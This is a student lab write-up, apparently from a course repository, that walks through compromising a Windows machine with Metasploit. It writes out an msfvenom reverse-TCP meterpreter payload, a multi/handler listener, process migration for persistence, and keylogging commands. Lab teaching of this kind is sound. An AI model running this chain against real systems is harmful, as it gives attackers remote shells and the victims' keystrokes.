# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/d33317f3-8eca-4159-8649-40e3ec9f8b4d)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/bdb759ae-90ea-49de-b23f-e2bcaa76a6ed)

copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/30cc4ec7-d524-4f5c-9b95-e9061994b4d8)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/79e04102-27ad-4ace-9dfe-19a2f9d1eb2d)

Check the status of apache2

![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/ca8f79f0-3c7a-4798-8538-1a768faa4b96)

## Invoke msfconsole:
## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/a97789c6-6169-42ac-9f3b-74adff80c6cc)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/cf7d59da-832d-4dff-b833-3d1859e221a6)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/2f30398f-f5c5-40e4-870f-d39f19d71744)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/a3e26eee-b15d-4557-a431-94d3ecb5bcf7)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Prasanth9025/Compromising-windows-using-Metasploit/assets/118343686/5ef5a4a7-0734-4686-889e-8c2aaa8a593c)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
